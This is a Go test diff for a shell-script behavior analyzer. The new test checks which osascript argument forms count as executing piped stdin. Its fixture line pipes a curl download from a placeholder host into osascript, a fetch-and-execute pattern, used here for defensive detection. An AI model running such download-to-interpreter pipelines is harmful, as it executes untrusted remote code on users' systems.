@@ -562,6 +562,28 @@ func TestAnalyzeShellLineUnwrapsCommandWrappers(t *testing.T) {
 	}
 }
 
+func TestOSAScriptPipelineRequiresAutomaticStdinExecution(t *testing.T) {
+	for _, test := range []struct {
+		args string
+		want int
+	}{
+		{"", 1},
+		{"-s ho -l JavaScript - argument", 1},
+		{"-i", 0},
+		{"-s x", 0},
+		{"-l Ruby", 0},
+		{"-e 'return 1'", 0},
+		{"--execute 'return 1'", 0},
+		{"fixture.scpt", 0},
+	} {
+		var graph behavior.Graph
+		AnalyzeShellLine(&graph, artifact.Content{NodeID: "node-1", LogicalPath: "fixture.sh"}, "curl https://example.invalid/test | osascript "+test.args, 1, testConnectedExecution("root-1"), "ev-1")
+		if got := countRelationKind(graph.Relations, behavior.RelationPipesTo); got != test.want {
+			t.Fatalf("%s: pipes-to=%d, want %d", test.args, got, test.want)
+		}
+	}
+}
+
 func TestAnalyzeShellLineWrapperAssignmentsAreNotCommands(t *testing.T) {
 	var graph behavior.Graph
 	content := artifact.Content{NodeID: "node-0001", LogicalPath: "install.sh"}
